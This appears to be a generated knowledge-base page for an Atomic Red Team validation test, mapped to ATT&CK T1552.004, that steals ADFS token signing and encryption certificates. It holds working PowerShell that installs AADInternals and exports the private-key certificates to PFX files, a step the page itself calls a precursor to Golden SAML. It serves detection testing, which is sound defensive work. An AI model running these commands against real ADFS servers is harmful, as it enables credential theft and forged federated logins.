---
atomic_guid: "78e95057-d429-4e66-8f82-0f060c1ac96f"
title: "ADFS token signing and encryption certificates theft - Local"
framework: "atomic"
generated: "true"
attack_technique_id: "T1552.004"
attack_technique_name: "Unsecured Credentials: Private Keys"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "78e95057-d429-4e66-8f82-0f060c1ac96f"
  - "ADFS token signing and encryption certificates theft - Local"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# ADFS token signing and encryption certificates theft - Local

Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.
Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.

## Metadata

- Atomic GUID: 78e95057-d429-4e66-8f82-0f060c1ac96f
- Technique: T1552.004: Unsecured Credentials: Private Keys
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1552.004/T1552.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1552-unsecured_credentials|T1552.004]]

## Dependencies

AADInternals module must be installed.

### Prerequisite Check

```powershell
if (Get-Module AADInternals) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Install-Module -Name AADInternals -Force
```

## Executor

- name: powershell

### Command

```powershell
Import-Module AADInternals -Force
Export-AADIntADFSCertificates
Get-ChildItem | Where-Object {$_ -like "ADFS*"}
Write-Host "`nCertificates retrieved successfully"
```

### Cleanup

```powershell
Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.yaml)
